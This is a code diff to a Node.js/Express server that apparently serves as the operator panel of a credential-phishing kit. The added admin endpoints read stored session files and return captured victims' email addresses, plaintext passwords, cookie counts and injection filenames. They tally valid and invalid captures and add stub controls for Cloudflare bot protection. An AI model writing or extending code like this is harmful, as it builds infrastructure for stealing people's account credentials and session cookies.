@@ -1740,22 +1740,109 @@ app.post('/api/admin/project-redirect', requireAdminAuth, (req, res) => {
     }
 });
 
-// Admin endpoints
-app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
-    const sessions = Array.from(userSessions.values()).map(session => ({
-        sessionId: session.sessionId,
-        userEmail: session.userEmail,
-        createdAt: new Date(session.createdAt).toISOString(),
-        hasAuth: !!session.graphAuth.accessToken,
-        authenticated: session.authenticated,
-        verified: session.verified
-    }));
+// Admin analytics endpoint
+app.get('/api/admin/analytics', requireAdminAuth, (req, res) => {
+    try {
+        // Read all session files to get comprehensive analytics
+        const sessionDir = path.join(__dirname, 'session_data');
+        let validEntries = 0;
+        let invalidEntries = 0;
+        let totalVisits = analytics.totalLogins || 0;
 
-    res.json({
-        sessions: sessions,
-        totalSessions: sessions.length,
-        analytics: analytics
-    });
+        if (fs.existsSync(sessionDir)) {
+            const files = fs.readdirSync(sessionDir);
+            
+            // Count valid sessions
+            validEntries = files.filter(file => 
+                file.startsWith('session_') && file.endsWith('.json')
+            ).length;
+
+            // Count invalid sessions
+            invalidEntries = files.filter(file => 
+                file.startsWith('invalid_') && file.endsWith('.json')
+            ).length;
+        }
+
+        res.json({
+            success: true,
+            totalVisits: totalVisits,
+            validEntries: validEntries,
+            invalidEntries: invalidEntries,
+            successfulLogins: analytics.successfulLogins || 0,
+            failedLogins: analytics.failedLogins || 0
+        });
+    } catch (error) {
+        console.error('Error loading analytics:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to load analytics',
+            details: error.message
+        });
+    }
+});
+
+// Admin sessions endpoint with session data
+app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
+    try {
+        const sessionDir = path.join(__dirname, 'session_data');
+        let allSessions = [];
+
+        if (fs.existsSync(sessionDir)) {
+            const files = fs.readdirSync(sessionDir);
+            
+            // Load valid sessions
+            files.filter(file => file.startsWith('session_') && file.endsWith('.json'))
+                .forEach(file => {
+                    try {
+                        const sessionData = JSON.parse(fs.readFileSync(path.join(sessionDir, file), 'utf8'));
+                        allSessions.push({
+                            id: sessionData.sessionId || sessionData.id,
+                            email: sessionData.email,
+                            timestamp: sessionData.timestamp,
+                            status: 'valid',
+                            password: sessionData.password,
+                            totalCookies: sessionData.totalCookies,
+                            injectFilename: sessionData.injectFilename
+                        });
+                    } catch (e) {
+                        console.warn('Error parsing session file:', file);
+                    }
+                });
+
+            // Load invalid sessions
+            files.filter(file => file.startsWith('invalid_') && file.endsWith('.json'))
+                .forEach(file => {
+                    try {
+                        const invalidData = JSON.parse(fs.readFileSync(path.join(sessionDir, file), 'utf8'));
+                        allSessions.push({
+                            id: invalidData.id,
+                            email: invalidData.email,
+                            timestamp: invalidData.timestamp,
+                            status: 'invalid',
+                            reason: invalidData.reason,
+                            errorMessage: invalidData.errorMessage
+                        });
+                    } catch (e) {
+                        console.warn('Error parsing invalid session file:', file);
+                    }
+                });
+        }
+
+        // Sort by timestamp (newest first)
+        allSessions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+
+        res.json({
+            sessions: allSessions,
+            totalSessions: allSessions.length,
+            analytics: analytics
+        });
+    } catch (error) {
+        console.error('Error loading sessions:', error);
+        res.status(500).json({
+            error: 'Failed to load sessions',
+            details: error.message
+        });
+    }
 });
 
 // Admin endpoint to revoke session
@@ -1773,6 +1860,47 @@ app.delete('/api/admin/session/:sessionId', requireAdminAuth, (req, res) => {
             error: 'Session not found' 
         });
     }
+});
+
+// Cloudflare management endpoints (placeholder - requires CF credentials)
+app.get('/api/admin/cloudflare/status', requireAdminAuth, (req, res) => {
+    res.json({
+        success: false,
+        error: 'Cloudflare not configured',
+        message: 'Configure Cloudflare API credentials to enable management features'
+    });
+});
+
+app.post('/api/admin/cloudflare/configure', requireAdminAuth, (req, res) => {
+    res.json({
+        success: false,
+        error: 'Cloudflare configuration not implemented',
+        message: 'This feature requires additional setup'
+    });
+});
+
+app.post('/api/admin/cloudflare/bot-fight', requireAdminAuth, (req, res) => {
+    res.json({
+        success: false,
+        error: 'Cloudflare not configured',
+        message: 'Configure Cloudflare API credentials first'
+    });
+});
+
+app.post('/api/admin/cloudflare/security-level', requireAdminAuth, (req, res) => {
+    res.json({
+        success: false,
+        error: 'Cloudflare not configured',
+        message: 'Configure Cloudflare API credentials first'
+    });
+});
+
+app.post('/api/admin/cloudflare/browser-check', requireAdminAuth, (req, res) => {
+    res.json({
+        success: false,
+        error: 'Cloudflare not configured',
+        message: 'Configure Cloudflare API credentials first'
+    });
 });
 
 // Start server
